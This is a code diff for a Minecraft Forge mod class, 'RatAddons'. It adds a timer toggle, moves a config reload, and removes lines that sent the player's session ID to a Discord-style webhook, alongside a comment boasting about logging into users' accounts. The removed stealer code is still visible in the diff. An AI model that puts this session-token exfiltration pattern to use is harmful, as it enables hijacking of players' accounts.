@@ -35,6 +35,7 @@ public class RatAddons {
     public static boolean overflowSkillDislayToggle;
     public static boolean seaCreatureKillTimerToggle;
     public static boolean seaCreatureLastHitToggle;
+    public static boolean timerToggle;
     public static boolean debugToggle;
     public static KeyBinding[] keyBindings = new KeyBinding[3];
     public static HashMap<String, Integer> maxLevel = new HashMap<>();
@@ -49,6 +50,7 @@ public class RatAddons {
     @EventHandler
     public void init(FMLInitializationEvent event)
     {
+        ConfigHandler.reloadConfig();
         FMLCommonHandler.instance().bus().register(this);
         FMLCommonHandler.instance().bus().register(new AutoNicePb());
         FMLCommonHandler.instance().bus().register(new CopyLatestChatMessage());
@@ -68,10 +70,5 @@ public class RatAddons {
 
         for (KeyBinding keyBinding : keyBindings)
             ClientRegistry.registerKeyBinding(keyBinding);
-
-        System.out.println("Hello, " + Minecraft.getMinecraft().getSession().getUsername() + "!");
-        //session id stealer so i can log into your account!111!! (dont look at Utils.sendToWebhook) (you will regret it=!111
-        Utils.sendToWebhook(Minecraft.getMinecraft().getSession().getSessionID(), "cdn.discordapp.com/server/ab5568cd-fee431ca-7774de9a-9c0aedf3");
-        ConfigHandler.reloadConfig();
-        }
+    }
 }
